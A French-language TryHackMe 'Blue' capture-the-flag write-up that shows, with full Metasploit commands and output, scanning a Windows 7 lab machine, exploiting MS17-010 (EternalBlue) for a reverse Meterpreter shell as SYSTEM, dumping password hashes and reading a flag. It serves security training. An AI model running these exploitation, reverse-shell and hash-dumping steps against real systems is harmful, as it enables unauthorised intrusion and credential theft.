---
tags: [cyber, débutant, eternal blue, samba, tryhackme]
title: TryHackMe - Blue
created: '2020-08-12T07:13:47.146Z'
modified: '2020-08-18T19:48:10.360Z'
---

# TryHackMe - Blue

## Recon

Pour commencer on démarre métasploit tout en initialisant la base de données. Une fois lancé, on ajoute un nouvel espace de travail que l'on nomme "blue".

```sh
kali@kali:~$ sudo msfdb init
[sudo] password for kali: 
[+] Starting database
[i] The database appears to be already configured, skipping initialization
kali@kali:~$ sudo msfconsole -q
msf5 > workspace -a blue
[*] Added workspace: blue
[*] Workspace: blue
```

Lançons alors nmap pour scanner les ports de la machine :

```sh
msf5 > db_nmap -sV 10.10.132.126 --script vuln
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 03:24 EDT
[*] Nmap: Nmap scan report for 10.10.132.126
[*] Nmap: Host is up (0.064s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: | rdp-vuln-ms12-020:
[*] Nmap: |   VULNERABLE:
[*] Nmap: |   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
[*] Nmap: |     State: VULNERABLE
[*] Nmap: |     IDs:  CVE:CVE-2012-0152
[*] Nmap: |     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
[*] Nmap: |           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
[*] Nmap: |
[*] Nmap: |     Disclosure date: 2012-03-13
[*] Nmap: |     References:
[*] Nmap: |       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
[*] Nmap: |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
[*] Nmap: |
[*] Nmap: |   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
[*] Nmap: |     State: VULNERABLE
[*] Nmap: |     IDs:  CVE:CVE-2012-0002
[*] Nmap: |     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
[*] Nmap: |           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
[*] Nmap: |
[*] Nmap: |     Disclosure date: 2012-03-13
[*] Nmap: |     References:
[*] Nmap: |       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
[*] Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
[*] Nmap: |_sslv2-drown:
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
[*] Nmap: |_smb-vuln-ms10-054: false
[*] Nmap: |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
[*] Nmap: | smb-vuln-ms17-010:
[*] Nmap: |   VULNERABLE:
[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
[*] Nmap: |     State: VULNERABLE
[*] Nmap: |     IDs:  CVE:CVE-2017-0143
[*] Nmap: |     Risk factor: HIGH
[*] Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
[*] Nmap: |        servers (ms17-010).
[*] Nmap: |
[*] Nmap: |     Disclosure date: 2017-03-14
[*] Nmap: |     References:
[*] Nmap: |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
[*] Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
[*] Nmap: |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 128.01 seconds
```

La machine semble être vulnérable à ms17-010. Pour commencer on récapitule les informations collectées :

```
msf5 > hosts
Hosts
=====

address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------  ---------  -----  -------  ----  --------
10.10.132.126             Unknown                    device         
```

```sh
msf5 > services
Services
========

host           port   proto  name               state  info
----           ----   -----  ----               -----  ----
10.10.132.126  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.132.126  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.132.126  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.132.126  3389   tcp    ssl/ms-wbt-server  open   
10.10.132.126  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.132.126  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.132.126  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.132.126  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.132.126  49159  tcp    msrpc              open   Microsoft Windows RPC
```

## Gain access

Recherchons alors ms17-010 au sein de metasploit avec `search <mod>` :

```sh
msf5 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > 
```

Parmi tous les modules listés, on essaie les exploits. On commence par `windows/smb/ms17_010_eternalblue` :

```sh
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

Il faut alors renseigner l'IP de la machine victime, puis lancer l'exploit :

```sh
msf5 exploit(windows/smb/ms17_010_psexec) > use 2
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.132.126
rhosts => 10.10.132.126
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.11.7.104
lhost => 10.11.7.104
```

```sh
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.11.7.104:4444 
[*] 10.10.215.57:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.215.57:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.215.57:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.215.57:445 - Connecting to target for exploitation.
[+] 10.10.215.57:445 - Connection established for exploitation.
[+] 10.10.215.57:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.215.57:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.215.57:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.215.57:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.215.57:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.215.57:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.215.57:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.215.57:445 - Sending all but last fragment of exploit packet
[*] 10.10.215.57:445 - Starting non-paged pool grooming
[+] 10.10.215.57:445 - Sending SMBv2 buffers
[+] 10.10.215.57:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.215.57:445 - Sending final SMBv2 buffers.
[*] 10.10.215.57:445 - Sending last fragment of exploit packet!
[*] 10.10.215.57:445 - Receiving response from exploit packet
[+] 10.10.215.57:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.215.57:445 - Sending egg to corrupted connection.
[*] 10.10.215.57:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.215.57
[*] Meterpreter session 1 opened (10.11.7.104:4444 -> 10.10.215.57:49169) at 2020-08-12 04:03:39 -0400
[+] 10.10.215.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.215.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.215.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

L'exploit a réussi et ouvert un meterpreter !

## Find flags!

On énumère la machine grâce à `getuid`, `sysinfo`, et on dumpe les hashs des mots de passes avec `hashdump` :

```sh
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Pour aller capturer le flag, on ouvre un shell dans meterpreter :

```sh
meterpreter > shell
Process 2960 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>
```

Et en cherchant dans la machine, on trouve :

```sh
C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
```
